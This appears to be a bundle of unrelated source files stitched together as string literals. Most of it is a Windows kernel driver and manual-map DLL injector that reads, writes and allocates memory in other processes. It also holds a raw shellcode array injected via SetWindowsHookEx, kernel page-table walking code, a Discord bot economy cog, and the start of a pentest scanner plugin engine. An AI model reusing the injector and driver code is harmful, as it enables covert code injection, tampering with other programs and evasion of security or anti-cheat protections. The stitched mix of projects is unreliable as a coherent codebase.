										status = OnQueryDriverQuit( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryUserProcess:
								{
									const auto request = static_cast< const QueryUserProcessRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryUserProcessRequest ) )
									{
										QueryUserProcessResponse response = { SignatureResponse };

										status = OnQueryUserProcess( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::QueryUserImage:
								{
									const auto request = static_cast< const QueryUserImageRequest* >( io_request_data );

									if( io_request_size >= sizeof( QueryUserImageRequest ) )
									{
										QueryUserImageResponse response = { SignatureResponse };

										status = OnQueryUserImage( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryCommit:
								{
									const auto request = static_cast< UserMemoryCommitRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryCommitRequest ) )
									{
										UserMemoryCommitResponse response = { SignatureResponse };
										status = FuckedUpMemoryAllocate( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryFree:
								{
									const auto request = static_cast< const UserMemoryFreeRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryFreeRequest ) )
									{
										UserMemoryFreeResponse response = { SignatureResponse };

										status = OnUserMemoryFree( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryRead:
								{
									const auto request = static_cast< const UserMemoryReadRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryReadRequest ) )
									{
										UserMemoryReadResponse response = { SignatureResponse };
										status = OnUserMemoryRead( request, &response );
										information = sizeof( response );
										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryWrite:
								{
									const auto request = static_cast< const UserMemoryWriteRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryWriteRequest ) )
									{
										UserMemoryWriteResponse response = { SignatureResponse };

										status = OnUserMemoryWrite( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryQuery:
								{
									const auto request = static_cast< const UserMemoryQueryRequest* >( io_request_data );

									if( io_request_size >= sizeof( UserMemoryQueryRequest ) )
									{
										UserMemoryQueryResponse response = { SignatureResponse };

										status = OnUserMemoryQuery( request, &response );
										information = sizeof( response );

										std::memcpy( io_response_data, &response, sizeof( response ) );
									}

									break;
								}
								case Operation::UserMemoryProtect:
								{
									const auto request = static_cast<const UserMemoryProtectRequest*>(io_request_data);

									if (io_request_size >= sizeof(UserMemoryProtectRequest))
									{
										UserMemoryProtectResponse response = { SignatureResponse };

										status = OnUserMemoryProtect(request, &response);
										information = sizeof(response);

										std::memcpy(io_response_data, &response, sizeof(response));
									}

									break;
								}
							}
							break;
						}
					}
				}
			}
		}
	}

	if( information )
	{
		irp->IoStatus.Status = status;
		irp->IoStatus.Information = information;

		IoCompleteRequest( irp, IO_NO_INCREMENT );
	}
	else
	{
		status = STATUS_NOT_IMPLEMENTED;
	}

	return status;
}

NTSTATUS DeviceControl( DEVICE_OBJECT* device_object, IRP* irp )
{
	auto status = STATUS_SUCCESS;

	__try
	{
		status = DispatchDeviceControl( device_object, irp );

		if( status == STATUS_NOT_IMPLEMENTED )
		{
			status = g_driver_dispatch( device_object, irp );
		}
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		TRACE( "%s: Exception occurred! (0x%08X)", __FUNCTION__, GetExceptionCode() );
		status = g_driver_dispatch( device_object, irp );
	}

	return status;
}

NTSTATUS DeviceControlComplete( IRP* irp, NTSTATUS status, ULONG_PTR information )
{
	irp->IoStatus.Status = status;
	irp->IoStatus.Information = information;

	IoCompleteRequest( irp, IO_NO_INCREMENT );
	return irp->IoStatus.Status;
}

`,Ch=`# minabot_cog.py — economy cog: SQLite-backed balance, daily reward, and shop with role assignment
# Source: Desktop/minaBot2/cogs/economy.py

import discord
from discord.ext import commands
import asyncio
from datetime import datetime
from typing import Optional
from utils import utility
from db import db

utility_api = utility.utility_api()
db_manager  = db.database_manager()
BOT_COLOR   = utility_api.get_bot_color()


class Economy(commands.Cog):
    """Economy system with currency, shop, and gambling."""

    def __init__(self, bot):
        self.bot      = bot
        self.utility  = utility_api
        self.db       = db_manager

        self.currency_name  = "coins"
        self.currency_emoji = "🪙"
        self.daily_amount   = 500
        self.daily_cooldown = 86400    # 24 h

    async def cog_check(self, ctx):
        return self.utility.check_white_listed(ctx.author.id)

    def get_user_data(self, user_id: int):
        """Return (or lazily create) the economy row for *user_id*."""
        data = self.db.record("SELECT * FROM economy WHERE user_id = ?", user_id)
        if not data:
            self.db.execute(
                """INSERT INTO economy
                   (user_id, balance, bank, last_daily, last_work, total_earned, total_spent)
                   VALUES (?, 0, 0, 0, 0, 0, 0)""",
                user_id,
            )
            self.db.commit()
            data = self.db.record("SELECT * FROM economy WHERE user_id = ?", user_id)
        return data

    def update_balance(self, user_id: int, amount: int, update_bank: bool = False):
        col = "bank" if update_bank else "balance"
        self.db.execute(
            f"UPDATE economy SET {col} = {col} + ? WHERE user_id = ?",
            amount, user_id,
        )
        self.db.commit()

    def log_transaction(self, user_id: int, amount: int, trans_type: str, description: str):
        ts = int(datetime.utcnow().timestamp())
        self.db.execute(
            "INSERT INTO transactions (user_id, amount, type, description, timestamp) VALUES (?, ?, ?, ?, ?)",
            user_id, amount, trans_type, description, ts,
        )
        self.db.commit()

    @commands.command(name="daily")
    async def daily(self, ctx):
        """Claim daily coins (24-hour cooldown)."""
        data      = self.get_user_data(ctx.author.id)
        last_daily = data[3]
        now        = int(datetime.utcnow().timestamp())

        if now - last_daily < self.daily_cooldown:
            time_left = self.daily_cooldown - (now - last_daily)
            hours, minutes = divmod(time_left, 3600)
            minutes //= 60
            return await ctx.send(
                f"{ctx.author.mention}, already claimed! come back in **{hours}h {minutes}m**",
                delete_after=10,
            )

        self.update_balance(ctx.author.id, self.daily_amount)
        self.db.execute(
            "UPDATE economy SET last_daily = ?, total_earned = total_earned + ? WHERE user_id = ?",
            now, self.daily_amount, ctx.author.id,
        )
        self.db.commit()
        self.log_transaction(ctx.author.id, self.daily_amount, "daily", "Daily reward claimed")

        embed = discord.Embed(
            description=(
                f"{self.currency_emoji} **you claimed {self.daily_amount:,} {self.currency_name}!**\\n"
                "come back in 24 hours for more."
            ),
            color=BOT_COLOR,
        )
        await ctx.send(embed=embed)

    @commands.command(name="balance", aliases=["bal"])
    async def balance(self, ctx, member: Optional[discord.Member] = None):
        target = member or ctx.author
        data   = self.get_user_data(target.id)
        wallet, bank = data[1], data[2]

        embed = discord.Embed(title=f"{target.display_name}'s balance", color=BOT_COLOR)
        embed.add_field(name=f"{self.currency_emoji} wallet", value=f"{wallet:,}", inline=True)
        embed.add_field(name="🏦 bank",   value=f"{bank:,}",   inline=True)
        embed.add_field(name="💰 total",  value=f"{wallet + bank:,}", inline=True)
        embed.set_thumbnail(url=target.display_avatar.url)
        await ctx.send(embed=embed)


async def setup(bot: commands.Bot):
    await bot.add_cog(Economy(bot))
`,Ph=`// mm_map_section.cpp — manual mapper internals: section copy, base relocation, import descriptor walk
// Source: D:/BackupFolder/desktop 1114/injector-master/Loader/core/mmaps.cpp

IMAGE_NT_HEADERS* GetImageNtHeaders( std::uintptr_t image )
{
	if( !image )
		return nullptr;

	const auto image_dos_header = reinterpret_cast< IMAGE_DOS_HEADER* >( image );

	if( image_dos_header->e_magic != IMAGE_DOS_SIGNATURE )
		return nullptr;

	const auto image_nt_headers = reinterpret_cast< IMAGE_NT_HEADERS* >( image + image_dos_header->e_lfanew );

	if( image_nt_headers->Signature != IMAGE_NT_SIGNATURE )
		return nullptr;

	return image_nt_headers;
}

bool MapImageHeader( std::uintptr_t image, std::uintptr_t image_data )
{
	const auto image_nt_headers = GetImageNtHeaders( image_data );

	if( !image_nt_headers )
	{
		return false;
	}

	const auto image_size = image_nt_headers->OptionalHeader.SizeOfHeaders;

	E_LOG( "%s: [0x%016llX] -> [0x%016llX] (0x%08X)", __FUNCTION__, image_data, image, image_size );

	const auto image_pointer = memory::ToPointer( image );
	const auto image_data_pointer = memory::ToPointer( image_data );

	std::memcpy( image_pointer, image_data_pointer, image_size );

	return true;
}

bool MapImageSection( std::uintptr_t image, std::uintptr_t image_data )
{
	const auto image_nt_headers = GetImageNtHeaders( image );

	if( !image_nt_headers )
		return false;

	const auto image_section_header = IMAGE_FIRST_SECTION( image_nt_headers );

	if( !image_section_header )
		return false;

	for( std::uint16_t i = 0; i < image_nt_headers->FileHeader.NumberOfSections; i++ )
	{
		const auto image_section = &image_section_header[ i ];

		if( !image_section )
			continue;

		char section_name[ 9 ] = { };
		std::memcpy( section_name, image_section->Name, sizeof( image_section->Name ) );

		E_LOG( "%s: \\"%s\\" [0x%016llX] -> [0x%016llX] (0x%08X)", __FUNCTION__, section_name, image_data + image_section->PointerToRawData, image + image_section->VirtualAddress, image_section->SizeOfRawData );

		const auto destination = memory::ToPointer( image + image_section->VirtualAddress );
		const auto source = memory::ToPointer( image_data + image_section->PointerToRawData );
		const auto size = static_cast< std::size_t >( image_section->SizeOfRawData );

		std::memcpy( destination, source, size );
	}

	return true;
}

struct ImageRelocationData
{
	std::uintptr_t m_address = 0;
	std::uint16_t* m_item = nullptr;
	std::uint32_t m_count = 0;
};

struct ImageRelocationEntry
{
	std::uint32_t VirtualAddress;
	std::uint32_t SizeOfBlock;
	std::uint16_t TypeOffset[ 1 ] = { };
};

bool MapImageRelocation( std::uintptr_t image, std::uintptr_t image_data, IMAGE_NT_HEADERS* image_nt_headers )
{
	const auto image_data_directory = image_nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

	if( !image_data_directory.VirtualAddress || !image_data_directory.Size )
	{
		E_LOG( "%s: No relocations...", __FUNCTION__ );
		return true;
	}

	auto base_relocation = reinterpret_cast< IMAGE_BASE_RELOCATION* >( image_data + image_data_directory.VirtualAddress );
	auto base_relocation_end = memory::ToAddress( base_relocation ) + image_data_directory.Size;

	while( base_relocation && base_relocation->VirtualAddress && base_relocation->SizeOfBlock && base_relocation->VirtualAddress < base_relocation_end )
	{
		ImageRelocationData image_relocation =
		{
			image_data + base_relocation->VirtualAddress,
			reinterpret_cast< std::uint16_t* >( memory::ToAddress( base_relocation ) + sizeof( IMAGE_BASE_RELOCATION ) ),
			static_cast< std::uint32_t >( ( base_relocation->SizeOfBlock - sizeof( IMAGE_BASE_RELOCATION ) ) / sizeof( std::uint16_t ) ),
		};

		for( auto i = 0u; i < image_relocation.m_count; i++ )
		{
			const auto type = static_cast< std::uint16_t >( image_relocation.m_item[ i ] >> 12 );
			const auto offset = static_cast< std::uint16_t >( image_relocation.m_item[ i ] & 0xFFF );

			if( type == IMAGE_REL_BASED_HIGHLOW ||
					type == IMAGE_REL_BASED_DIR64 )
			{
				E_LOG( "%s: [0x%016llX] [0x%04X] [0x%04X] (0x%016llX)", __FUNCTION__, image_relocation.m_address, type, offset, image - image_nt_headers->OptionalHeader.ImageBase );
				*reinterpret_cast< std::uintptr_t* >( image_relocation.m_address + offset ) += ( image - image_nt_headers->OptionalHeader.ImageBase );
			}
		}

		base_relocation = reinterpret_cast< IMAGE_BASE_RELOCATION* >( memory::ToAddress( base_relocation ) + base_relocation->SizeOfBlock );
	}

	return true;
}

BYTE remote_load_library[96] =
{
	0x48, 0x83, 0xEC, 0x38, 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
	0x83, 0x38, 0x00, 0x75, 0x3D, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x40,
	0x08, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x83, 0xC0, 0x18, 0x48, 0x8B, 0xC8, 0xFF, 0x54, 0x24, 0x28, 0x48, 0x8B,
	0x4C, 0x24, 0x20, 0x48, 0x89, 0x41, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x20, 0xC7, 0x00, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC
}; DWORD shell_data_offset = 0x6;

/////////////////////////////////
typedef struct _load_library_struct
{
	int status;
	uintptr_t fn_load_library_a;
	uintptr_t module_base;
	char module_name[80];
}load_library_struct;

typedef struct _main_struct
{
	int status;
	uintptr_t fn_dll_main;
	HINSTANCE dll_base;
} main_struct;
/////////////////////////////////

/////////////////////////////////
uintptr_t call_remote_load_library(LPCSTR dll_name)
{
	auto& driver = io::DriverControl::Instance();

	/////////////////////////////////
	HMODULE nt_dll = LoadLibraryW(L"ntdll.dll");
	/////////////////////////////////

	/////////////////////////////////
	auto alloc_shell_code = driver.Commit(PAGE_SIZE, PAGE_READWRITE);
	DWORD shell_size = sizeof(remote_load_library) + sizeof(load_library_struct);
	PVOID alloc_local = VirtualAlloc(NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	/////////////////////////////////

	/////////////////////////////////
	RtlCopyMemory(alloc_local, &remote_load_library, sizeof(remote_load_library));
	uintptr_t shell_data = (uintptr_t)alloc_shell_code.m_address + sizeof(remote_load_library);
	*(uintptr_t*)((uintptr_t)alloc_local + shell_data_offset) = shell_data;
	load_library_struct* ll_data = (load_library_struct*)((uintptr_t)alloc_local + sizeof(remote_load_library));
	ll_data->fn_load_library_a = (uintptr_t)LoadLibraryA;
	strcpy_s(ll_data->module_name, 80, dll_name);
	/////////////////////////////////

	/////////////////////////////////
	driver.WriteMemory(alloc_shell_code.m_address, alloc_local, shell_size);
	HHOOK h_hook = SetWindowsHookExW(WH_GETMESSAGE, (HOOKPROC)alloc_shell_code.m_address, nt_dll, driver.GetThreadId());
	/////////////////////////////////

	/////////////////////////////////
	while (ll_data->status != 2)
	{
		PostThreadMessage(driver.GetThreadId(), WM_NULL, 0, 0);
		driver.ReadMemory(shell_data, (PVOID)ll_data, sizeof(load_library_struct));
		Sleep(10);
	} uintptr_t mod_base = ll_data->module_base;
	/////////////////////////////////

	/////////////////////////////////
	UnhookWindowsHookEx(h_hook);
	driver.FreeMemory(alloc_shell_code.m_address, shell_size, MEM_RELEASE);
	VirtualFree(alloc_local, 0, MEM_RELEASE);
	/////////////////////////////////

	return mod_base;
}

PVOID rva_va(uintptr_t rva, PIMAGE_NT_HEADERS nt_head, PVOID local_image)
{
	PIMAGE_SECTION_HEADER p_first_sect = IMAGE_FIRST_SECTION(nt_head);
	for (PIMAGE_SECTION_HEADER p_section = p_first_sect; p_section < p_first_sect + nt_head->FileHeader.NumberOfSections; p_section++)
		if (rva >= p_section->VirtualAddress && rva < p_section->VirtualAddress + p_section->Misc.VirtualSize)
			return (PUCHAR)local_image + p_section->PointerToRawData + (rva - p_section->VirtualAddress);

	return NULL;
}

uintptr_t resolve_func_addr(LPCSTR modname, LPCSTR modfunc)
{
	HMODULE h_module = LoadLibraryExA(modname, NULL, DONT_RESOLVE_DLL_REFERENCES);
	uintptr_t func_offset = (uintptr_t)GetProcAddress(h_module, modfunc);
	func_offset -= (uintptr_t)h_module;
	FreeLibrary(h_module);

	return func_offset;
}

extern "C" NTSYSAPI PIMAGE_NT_HEADERS NTAPI RtlImageNtHeader(PVOID Base);
BOOL resolve_import(PVOID p_local_img)
{
	const auto image_nt_headers = RtlImageNtHeader(p_local_img);
	if (!image_nt_headers)
		TRACE("Invalid PE Headers");

	TRACE("Resolving Imports...");

	PIMAGE_IMPORT_DESCRIPTOR import_desc = (PIMAGE_IMPORT_DESCRIPTOR)rva_va(image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, image_nt_headers, p_local_img);
	if (!image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress || !image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) return true;

	LPSTR module_name = NULL;
	while ((module_name = (LPSTR)rva_va(import_desc->Name, image_nt_headers, p_local_img)))
	{
		uintptr_t base_image;
		base_image = call_remote_load_library(module_name);

		if (!base_image)
			return false;

		PIMAGE_THUNK_DATA ih_data = (PIMAGE_THUNK_DATA)rva_va(import_desc->FirstThunk, image_nt_headers, p_local_img);
		while (ih_data->u1.AddressOfData)
		{
			if (ih_data->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)(ih_data->u1.Ordinal & 0xFFFF));
			else
			{
				IMAGE_IMPORT_BY_NAME* ibn = (PIMAGE_IMPORT_BY_NAME)rva_va(ih_data->u1.AddressOfData, image_nt_headers, p_local_img);
				ih_data->u1.Function = base_image + resolve_func_addr(module_name, (LPCSTR)ibn->Name);
				TRACE("%s: %s: [0x%016llX]", __FUNCTION__, ibn->Name, ih_data->u1.Function);
			} 
			ih_data++;
		} 
		import_desc++;
	} return true;
}

std::uintptr_t GetRemoteImageExport( std::uintptr_t image, const std::string& name )
{
	auto& driver = io::DriverControl::Instance();

	if( !image )
	{
		E_LOG( "%s: image is 0!", __FUNCTION__ );
		return 0;
	}

	const auto image_dos_header = driver.Read< IMAGE_DOS_HEADER >( image );

	if( image_dos_header.e_magic != IMAGE_DOS_SIGNATURE )
	{
		E_LOG( "%s: Not a valid DOS image!", __FUNCTION__ );
		return 0;
	}

	const auto image_nt_headers = driver.Read< IMAGE_NT_HEADERS >( image + image_dos_header.e_lfanew );

	if( image_nt_headers.Signature != IMAGE_NT_SIGNATURE )
	{
		E_LOG( "%s: Not a valid NT image!", __FUNCTION__ );
		return 0;
	}

	const auto& directory_entry_export = image_nt_headers.OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	if( !directory_entry_export.VirtualAddress || !directory_entry_export.Size )
	{
		E_LOG( "%s: Not a valid image export directory!", __FUNCTION__ );
		return 0;
	}

	const auto image_export_directory_data = std::make_unique< std::uint8_t[] >( directory_entry_export.Size );

	if( !driver.ReadMemory( image + directory_entry_export.VirtualAddress, image_export_directory_data.get(), directory_entry_export.Size ) )
	{
		E_LOG( "%s: ReadMemory( 0x%016llX, 0x%08X ) error!", __FUNCTION__, image + directory_entry_export.VirtualAddress, directory_entry_export.Size );
		return 0;
	}

	const auto image_export_directory = PIMAGE_EXPORT_DIRECTORY( image_export_directory_data.get() );
	const auto image_export_displacement = std::uintptr_t( image_export_directory_data.get() ) - directory_entry_export.VirtualAddress;

	const auto address_of_functions = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfFunctions );
	const auto address_of_names = reinterpret_cast< std::uint32_t* >( image_export_displacement + image_export_directory->AddressOfNames );
	const auto address_of_name_ordinals = reinterpret_cast< std::uint16_t* >( image_export_displacement + image_export_directory->AddressOfNameOrdinals );

	for( auto i = 0ul; i < image_export_directory->NumberOfNames; i++ )
	{
		const auto export_name = std::string( PCHAR( image_export_displacement + address_of_names[ i ] ) );

		if( core::ToLower( export_name ) == core::ToLower( name ) )
		{
			const auto export_ordinal = address_of_name_ordinals[ i ];
			return ( image + address_of_functions[ export_ordinal ] );
		}
	}

	E_LOG( "%s: Image export \\"%s\\" is not found in [0x%016llX]!", __FUNCTION__, name.c_str(), image );
	return 0;
}

bool MapImageImportDescriptor( std::uintptr_t image )
{
	auto& driver = io::DriverControl::Instance();

	const auto image_nt_headers = GetImageNtHeaders( image );

	if( !image_nt_headers )
		return false;

	const auto image_data_directory = image_nt_headers->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

	if( !image_data_directory.VirtualAddress || !image_data_directory.Size )
		return true;

	auto import_descriptor = reinterpret_cast< IMAGE_IMPORT_DESCRIPTOR* >( image + image_data_directory.VirtualAddress );

	while( import_descriptor && import_descriptor->Name )
	{
		const auto import_descriptor_name = reinterpret_cast< const char* >( image + import_descriptor->Name );
		const auto import_descriptor_name_wide = core::ToWideString( import_descriptor_name );
		const auto import_descriptor_image = driver.GetImage( import_descriptor_name_wide.c_str() );

		if( import_descriptor_image )
		{
			auto thunk_data = reinterpret_cast< IMAGE_THUNK_DATA* >( image + import_descriptor->FirstThunk );

			while( thunk_data && thunk_data->u1.AddressOfData )
			{
				if (!(thunk_data->u1.Ordinal & IMAGE_ORDINAL_FLAG64))
				{
					const auto import_by_name = reinterpret_cast< IMAGE_IMPORT_BY_NAME* >( image + thunk_data->u1.AddressOfData );
					const auto import_procedure = GetRemoteImageExport( import_descriptor_image, import_by_name->Name );

					if( import_procedure )
					{
						TRACE( "%s: %s: [0x%016llX]", __FUNCTION__, import_by_name->Name, import_procedure );
						thunk_data->u1.Function = import_procedure;
					}
				}

				thunk_data++;
			}
		}

		import_descriptor++;
	}

	return true;
}

struct ImageMapData
{
	std::uintptr_t m_base = 0;
	std::uint32_t m_size = 0;

	std::uintptr_t m_swap_chain = 0;
	std::uintptr_t m_swap_chain_restore = 0;

	std::uint32_t m_nt_query_virtual_memory = 0;
};

#define LOG		E_LOG

#pragma pack( push, 8 )

struct ExecuteData
{
	std::uint32_t m_status = 0;			// 0x0000
	
	std::uint64_t m_procedure = 0;	// 0x0008
	
	std::uint64_t m_rcx = 0;				// 0x0010
	std::uint64_t m_rdx = 0;				// 0x0018
	std::uint64_t m_r8 = 0;					// 0x0020

	std::uint64_t m_rax = 0;				// 0x0028
};
// sizeof( ExecuteData ) = 0x0030

`,Ih=`// page_walk.cpp — kernel-side page-table walking (PML4 -> PDPT -> PD -> PT) for present/readable/writeable/executable checks
// Source: D:/BackupFolder/desktop 1114/injector-master/Driver/winsdk/pagesdk.cpp

#include "pagesdk.hpp"
#include "log.hpp"

namespace atom::win32
{

void* GetVirtualForPhysical( const void* pointer )
{
	PHYSICAL_ADDRESS physical_address = { };
	physical_address.QuadPart = reinterpret_cast< LONGLONG >( pointer );
	return MmGetVirtualForPhysical( physical_address );
}

void* GetVirtualForPhysical( std::uintptr_t address )
{
	PHYSICAL_ADDRESS physical_address = { };
	physical_address.QuadPart = static_cast< LONGLONG >( address );
	return MmGetVirtualForPhysical( physical_address );
}

template< typename Type = void* >
Type GetVirtualAddress( const void* pointer )
{
	const auto virtual_address = GetVirtualForPhysical( pointer );
	return Type( virtual_address );
}

template< typename Type = void* >
Type GetVirtualAddress( std::uintptr_t address )
{
	const auto virtual_address = GetVirtualForPhysical( address );
	return Type( virtual_address );
}

bool GetPageData( const void* pointer, PageData* page_data )
{
	if( !page_data )
	{
		return false;
	}

	VIRTUAL_ADDRESS virtual_address = { };
	virtual_address.Value = reinterpret_cast< std::uint64_t >( pointer );

	CR3 cr3 = { };
	cr3.Value = __readcr3();

	auto pml4e = PFN_TO_PAGE( cr3.x64.Bitmap.PML4 ) + virtual_address.x64.Generic.PageMapLevel4Offset * sizeof( PML4E );
	page_data->m_pml4e = GetVirtualAddress< PML4E* >( pml4e );
	
	if( !page_data->m_pml4e )
	{
		return false;
	}

	if( !page_data->m_pml4e->x64.Generic.P )
	{
		return true;
	}

	auto pdpe = PFN_TO_PAGE( page_data->m_pml4e->x64.Generic.PDP ) + virtual_address.x64.Generic.PageDirectoryPointerOffset * sizeof( PDPE );
	page_data->m_pdpe = GetVirtualAddress< PDPE* >( pdpe );

	if( !page_data->m_pdpe )
	{
		return false;
	}

	if( page_data->m_pdpe->x64.Generic.PS )
	{
		if( !page_data->m_pdpe->x64.PageSize.Page1Gb.P )
		{
			return false;
		}

		page_data->m_type = PageData::Type::PageSize1Gb;
	}
	else
	{
		auto pde = PFN_TO_PAGE( page_data->m_pdpe->x64.NonPageSize.Generic.PD ) + virtual_address.x64.NonPageSize.Generic.PageDirectoryOffset * sizeof( PDE );
		page_data->m_pde = GetVirtualAddress< PDE* >( pde );

		if( !page_data->m_pde )
		{
			return false;
		}

		if( page_data->m_pde->x64.Generic.PS )
		{
			page_data->m_type = PageData::Type::PageSize2Mb;
		}
		else
		{
			page_data->m_type = PageData::Type::PageSize4Kb;

			auto pte = PFN_TO_PAGE( page_data->m_pde->x64.Page4Kb.PT ) + virtual_address.x64.NonPageSize.Page4Kb.PageTableOffset * sizeof( PTE );
			page_data->m_pte = GetVirtualAddress< PTE* >( pte );

			if( !page_data->m_pte )
			{
				return false;
			}
		}
	}

	return true;
}

bool GetPageData( std::uintptr_t address, PageData* page_data )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return GetPageData( pointer, page_data );
}

bool IsPagePresent( const void* pointer, std::size_t* page_size )
{
	bool page_present = false;
	PageData page_data = { };

	if( GetPageData( pointer, &page_data ) )
	{
		if( page_size )
		{
			*page_size = 0;
		}

		switch( page_data.m_type )
		{
			case PageData::Type::PageSize4Kb:
			{
				if( page_size )
				{
					*page_size = 4096;
				}
				page_present = page_data.m_pte->x64.Page4Kb.P;
				break;
			}
			case PageData::Type::PageSize2Mb:
			{
				if( page_size )
				{
					*page_size = 2048 * 1024;
				}
				page_present = page_data.m_pde->x64.Page2Mb.P;
				break;
			}
			case PageData::Type::PageSize1Gb:
			{
				if( page_size )
				{
					*page_size = 1024 * 1024 * 1024;
				}
				page_present = page_data.m_pdpe->x64.PageSize.Page1Gb.P;
				break;
			}
			default:
			{
				TRACE( "%s: Unknown page type = '%u'!", __FUNCTION__, static_cast< std::uint32_t >( page_data.m_type ) );
				break;
			}
		}

		return page_present;
	}
}

bool IsPagePresent( std::uintptr_t address, std::size_t* page_size )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return IsPagePresent( pointer, page_size );
}

bool IsProcessPagePresent( PEPROCESS process, const void* pointer, std::size_t* page_size )
{
	if( !process || process == PsGetCurrentProcess() )
	{
		return IsPagePresent( pointer, page_size );
	}

	KAPC_STATE apc_state = { };
	KeStackAttachProcess( process, &apc_state );
	bool page_present = IsPagePresent( pointer, page_size );
	KeUnstackDetachProcess( &apc_state );
	return page_present;
}

bool IsProcessPagePresent( PEPROCESS process, std::uintptr_t address, std::size_t* page_size )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return IsProcessPagePresent( process, pointer, page_size );
}

bool IsMemoryRangePresent( PEPROCESS process, const void* pointer, std::size_t size )
{
	if( !size )
	{
		return false;
	}

	KAPC_STATE apc_state = { };

	auto page_process = process && process != PsGetCurrentProcess();

	if( page_process )
	{
		KeStackAttachProcess( process, &apc_state );
	}

	auto page_present = false;
	auto page = pointer;

	do
	{
		std::size_t page_size = 0;
		page_present = IsPagePresent( page, &page_size ) && page_size;
		
		if( !page_present )
		{
			break;
		}

		page = reinterpret_cast< const void* >( reinterpret_cast< std::uintptr_t >( ALIGN_DOWN_POINTER_BY( page, page_size ) ) + page_size );
	}
	while( page < reinterpret_cast< const void* >( reinterpret_cast< std::uintptr_t >( pointer ) + size ) );

	if( page_process )
	{
		KeUnstackDetachProcess( &apc_state );
	}

	return page_present;
}

bool IsMemoryRangePresent( PEPROCESS process, std::uintptr_t address, std::size_t size )
{
	const auto pointer = reinterpret_cast< const void* >( address );
	return IsMemoryRangePresent( process, pointer, size );
}

bool IsPageReadable( std::uintptr_t address )
{
	std::size_t page_size = 0;
	return IsPagePresent( address, &page_size ) && page_size;
}

bool IsPageWriteable( std::uintptr_t address )
{
	bool page_write = false;
	PageData page_data = { };

	if( GetPageData( address, &page_data ) )
	{
		switch( page_data.m_type )
		{
			case PageData::Type::PageSize4Kb:
			{
				page_write = page_data.m_pte->x64.Page4Kb.P && page_data.m_pte->x64.Page4Kb.RW;
				break;
			}
			case PageData::Type::PageSize2Mb:
			{
				page_write = page_data.m_pde->x64.Page2Mb.P && page_data.m_pde->x64.Page2Mb.RW;
				break;
			}
			case PageData::Type::PageSize1Gb:
			{
				page_write = page_data.m_pdpe->x64.PageSize.Page1Gb.P && page_data.m_pdpe->x64.PageSize.Page1Gb.RW;
				break;
			}
			default:
			{
				TRACE( "%s: Unknown page type = '%u'!", __FUNCTION__, static_cast< std::uint32_t >( page_data.m_type ) );
				break;
			}
		}
	}

	return page_write;
}

bool IsPageExecuteable( std::uintptr_t address )
{
	bool page_execute = false;
	PageData page_data = { };

	if( GetPageData( address, &page_data ) )
	{
		switch( page_data.m_type )
		{
			case PageData::Type::PageSize4Kb:
`,Lh=`# pentest_plugin.py — plugin engine: YAML-template + Python module discovery and dispatch
# Source: Desktop/pentest/src/scan_tool/core/plugin_engine.py

from __future__ import annotations

import importlib
import importlib.util
import inspect
import logging
import pkgutil
import re
from abc import ABC, abstractmethod
from pathlib import Path
from typing import TYPE_CHECKING, AsyncGenerator, Optional

if TYPE_CHECKING:
    from scan_tool.core.context import ScanContext

import yaml

from scan_tool.core.target import AttackSurface, Finding

logger = logging.getLogger("scan_tool.plugins")


class BaseModule(ABC):
    name:        str = ""
    description: str = ""
    severity:    str = "info"
    phase:       str = "active"

    @abstractmethod
    async def run(self, target, http, surface, store) -> AsyncGenerator[Finding, None]:
        yield  # pragma: no cover

    async def run_with_context(self, ctx: "ScanContext") -> AsyncGenerator[Finding, None]:
        """New-style entry point; delegates to legacy run() for backward compat."""
        async for finding in self.run(ctx.target, ctx.http, ctx.surface, ctx.store):
            yield finding

    def should_run(self, surface: AttackSurface) -> bool:
        return True


class YAMLTemplateModule(BaseModule):
    """Nuclei-style declarative module loaded from a YAML template."""

    def __init__(self, template_path: Path):
        data         = yaml.safe_load(template_path.read_text())
        self.name    = data["id"]
